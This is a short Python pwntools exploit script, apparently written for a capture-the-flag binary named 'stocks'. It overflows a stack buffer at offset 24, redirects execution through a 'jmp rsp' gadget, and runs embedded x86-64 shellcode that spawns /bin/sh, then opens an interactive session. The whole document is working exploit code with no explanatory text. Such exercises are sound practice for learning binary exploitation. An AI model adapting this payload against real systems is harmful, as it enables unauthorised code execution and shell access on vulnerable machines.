from pwn import *

context.arch = 'amd64'
p = process ("./stocks")

OFFSET = 24
JMP_RSP = 0x401597                        
shellcode = bytes.fromhex("4831f65648bf2f62696e2f2f736857545f6a3b58990f05")
payload = b"A" * OFFSET + p64(JMP_RSP) + shellcode
p.sendlineafter(b": ", payload) 
p.interactive()
